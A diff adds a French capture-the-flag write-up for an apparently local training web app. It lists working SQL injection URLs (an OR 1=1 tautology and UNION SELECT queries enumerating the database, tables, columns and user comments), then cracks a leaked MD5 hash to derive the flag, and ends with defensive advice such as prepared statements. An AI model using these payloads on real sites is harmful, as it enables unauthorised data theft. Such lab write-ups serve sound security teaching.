@@ -1,0 +1,35 @@
+explication:
+    voir ex03
+
+URL: http://localhost:8080/?page=member&id=5 or 1=1&Submit=Submit#
+URL: http://localhost:8080/?page=member&id=5 UNION SELECT 1,2 -- &Submit=Submit#
+URL: http://localhost:8080/?page=member&id=5 UNION SELECT 1,database() -- &Submit=Submit#
+URL: http://localhost:8080/?page=member&id=5 UNION SELECT 1,version() -- &Submit=Submit#
+URL: http://localhost:8080/?page=member&id=5 UNION ALL SELECT 1, group_concat(table_name) FROM Information_schema.tables WHERE table_schema=database()&Submit=Submit#
+URL: http://localhost:8080/?page=member&id=5 union all select 1,group_concat(column_name) from Information_schema.columns where table_name=0x7573657273&Submit=Submit#
+URL: http://localhost:8080/?page=member&id=5 union all select 1,group_concat(Commentaire,0x0a) from users&Submit=Submit#
+
+On trouve ce message dans la section commentaire :
+
+ID: 5 union all select 1,group_concat(Commentaire,0x0a) from users
+First name: 1
+Surname : Je pense, donc je suis
+,Aamu on iltaa viisaampi.
+,Dublin is a city of stories and secrets.
+,Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+
+Il ne reste plus qu’à suivre la consigne. On obtient donc : 5ff9d0165b4f92b14994e5c685cdce28, que l’on va mettre en minuscule.
+
+On a un code encrypté en MD5. On le décrypte sur https://md5.gromweb.com/
+et on trouve FortyTwo.
+On le met en minuscule et on utilise sha256,
+et voici le flag :
+10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+solution:
+
+-utiliser des requêtes perparees, les valeurs sont envoyees separement de la requête
+-ne jammais concatener directement dans la requête
+-masquer les message d erreur sql
+-utiliser un firewall
+
